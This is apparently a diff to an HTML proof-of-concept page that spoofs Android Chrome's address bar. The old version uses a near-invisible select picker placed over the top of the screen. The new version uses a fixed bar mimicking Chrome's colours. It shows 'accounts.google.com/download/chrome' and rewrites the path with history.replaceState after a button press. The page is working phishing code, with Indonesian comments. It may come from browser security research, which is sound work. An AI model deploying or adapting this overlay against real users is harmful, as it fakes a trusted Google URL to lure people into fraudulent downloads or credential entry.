@@ -3,14 +3,8 @@
   <head>
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no, viewport-fit=cover" />
-    <title>Android Chrome Hardened Address Bar Spoofing PoC</title>
+    <title>Android Chrome Address Bar Overlay PoC</title>
     <style>
-      :root {
-        --sel-left: 0px;
-        --sel-top: -56px;
-        --sel-w: 100vw;
-        --sel-h: 1500px;
-      }
       body, html {
         margin: 0;
         padding: 0;
@@ -54,97 +48,74 @@
         word-break: break-all;
       }
       
-      /* Base-select geometry vector spoofing untuk Android Chrome */
-      select, ::picker(select) {
-        appearance: base-select;
-      }
-      #spoofSelect {
+      /* Overlay tiruan bilah alamat di bagian atas */
+      #spoofOverlay {
         position: fixed;
-        left: var(--sel-left);
-        top: var(--sel-top);
-        width: var(--sel-w);
-        height: var(--sel-h);
-        opacity: 0.001;
-        z-index: 2147483647;
-        border: none;
-        outline: none;
-        background: transparent;
-      }
-      ::picker(select) {
-        position: fixed;
-        left: 0;
         top: 0;
+        left: 0;
         width: 100vw;
         height: 56px;
-        margin-top: 0;
-        border: 0;
-        padding: 0;
         background: #35363a;
-        display: flex;
+        z-index: 2147483647;
+        display: none;
         align-items: center;
-        padding-left: 48px;
+        padding-left: 16px;
         box-sizing: border-box;
-        box-shadow: 0 4px 16px rgba(0,0,0,0.6);
+        box-shadow: 0 4px 12px rgba(0,0,0,0.5);
       }
-      option {
-        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      .fake-url {
         font-size: 14px;
-        color: #e8eaed;
-        background: transparent;
-        padding: 0;
-        margin: 0;
-        width: 100%;
+        font-family: -apple-system, BlinkMacSystemFont, sans-serif;
       }
       .host { color: #e8eaed; font-weight: 500; }
       .path { color: #9aa0a6; }
     </style>
   </head>
   <body>
-    <div class="container">
-      <button id="execBtn">INITIALIZE ANDROID SPOOF SURFACE</button>
-      <div class="info" id="statusInfo">Status: Ready for mobile viewport anchor execution.</div>
+    <!-- Overlay Tiruan URL -->
+    <div id="spoofOverlay">
+      <div class="fake-url">
+        <span class="host">accounts.google.com</span><span class="path">/download/chrome</span>
+      </div>
     </div>
 
-    <!-- Negative Anchor Select Element khusus Android -->
-    <select id="spoofSelect" size="5">
-      <option value="spoof">
-        <span class="host">accounts.google.com</span><span class="path">/download/chrome</span>
-      </option>
-    </select>
+    <div class="container">
+      <button id="execBtn">TRIGGER OVERLAY SPOOF</button>
+      <div class="info" id="statusInfo">Status: Ready to display spoof surface.</div>
+    </div>
 
     <script>
       let execButton = document.getElementById("execBtn");
       let statusInfo = document.getElementById("statusInfo");
-      let spoofSelect = document.getElementById("spoofSelect");
+      let spoofOverlay = document.getElementById("spoofOverlay");
       let hasExecuted = false;
 
-      function triggerAndroidSpoof() {
+      function triggerOverlaySpoof() {
         if (hasExecuted) return;
         hasExecuted = true;
 
-        statusInfo.innerText = "Status: Updating history state & triggering mobile picker surface...";
+        statusInfo.innerText = "Status: Updating history state & rendering overlay layer...";
         execButton.style.display = "none";
 
         try {
-          // 1. Sinkronisasi history state jalur lokal same-origin
+          // 1. Sinkronisasi history state jalur lokal
           history.replaceState({ target: "accounts.google.com" }, "", "/download/chrome");
 
-          // 2. Membersihkan indeks pilihan untuk menghilangkan indikator centang bawaan
-          spoofSelect.selectedIndex = -1;
+          // 2. Menampilkan elemen penindih visual di atas halaman
+          if (spoofOverlay) {
+            spoofOverlay.style.display = "flex";
+          }
 
-          // 3. Eksekusi showPicker dalam konteks gestur pengguna aktif (user activation)
-          spoofSelect.showPicker();
-
-          statusInfo.innerText = "Status: Mobile picker layer anchored successfully.";
+          statusInfo.innerText = "Status: Overlay surface active.";
         } catch (err) {
-          statusInfo.innerText = "Status: Execution notice: " + err.message;
+          statusInfo.innerText = "Status: Execution error: " + err.message;
           execButton.style.display = "block";
           hasExecuted = false;
         }
       }
 
       execButton.onclick = () => {
-        triggerAndroidSpoof();
+        triggerOverlaySpoof();
       };
     </script>
   </body>
